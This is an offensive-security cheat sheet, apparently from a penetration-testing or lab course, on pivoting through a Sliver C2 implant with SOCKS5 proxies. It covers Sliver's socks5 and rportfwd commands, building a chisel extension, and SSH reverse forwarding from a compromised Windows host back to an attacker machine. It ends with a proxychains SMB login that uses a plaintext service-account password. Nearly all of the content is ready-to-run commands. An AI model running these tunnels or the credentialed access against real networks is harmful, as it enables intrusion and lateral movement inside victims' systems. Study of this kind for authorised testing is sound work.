# 15.26 Tunneling SOCKS5 via Sliver

> Tunnel via Sliver's native SOCKS5 (sessions only), MrAle98's chisel extension, SSH reverse port-forward, or `rportfwd add`.

## Overview

Sliver's built-in SOCKS5 proxy tunnels traffic through a session (not beacon). The MrAle98 forked chisel extension adds reverse SOCKS5 via chisel server/client. SSH reverse port forwarding from the Windows target is a third option. `rportfwd add` creates reverse port forwards for file server access from deep-network sessions.

## Steps

- `socks5 start -P 1080` starts SOCKS5 through a session; verify with `netstat -ano | grep 1080`.
- Update proxychains to `socks5` and port `1080` for tool tunneling.
- Chisel extension (MrAle98 fork): clone, install mingw-w64, compile, copy extension.json, restart client.
- Start chisel server on attacker, then connect from beacon with `chisel client <ip>:<port> R:socks`.
- SSH reverse dynamic forwarding: configure SSH to port 2222, then from Windows `ssh -R 1080 -p 2222 <attacker>`.
- `rportfwd add -b 8080 -r 127.0.0.1:8080` relays attacker port 8080 via the pivot session.

## Commands

### Start SOCKS5 in session

```text
sliver (http-beacon) > socks5 start -P 1080
```

### Update proxychains config

```bash
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'
```

### Build chisel extension

```bash
git clone https://github.com/MrAle98/chisel && cd chisel/ && mkdir ~/.sliver-client/extensions/chisel && cp extension.json ~/.sliver-client/extensions/chisel && make windowsdll_64 && make windowsdll_32
```

### Start chisel server on attacker

```bash
chisel server --reverse -p 1337 -v --socks5
```

### Connect chisel client from beacon

```text
sliver (http-beacon) > chisel client 10.10.14.62:1337 R:socks
```

### Add reverse port forward

```text
sliver (http-beacon) > rportfwd add -b 8080 -r 127.0.0.1:8080
```

### Configure SSH port and restart (attacker)

```bash
sudo sh -c 'echo "Port 2222" >> /etc/ssh/sshd_config' && sudo systemctl restart sshd.service
```

### SSH reverse SOCKS from Windows target

```powershell
PS C:\Users\eric> ssh -R 1080  -p 2222 <attacker-user>@<attacker-ip>
```

### Verify pivot access via proxychains

```bash
proxychains nxc smb <TARGET> -u svc_sql -p 'jkhnrjk123!'
```
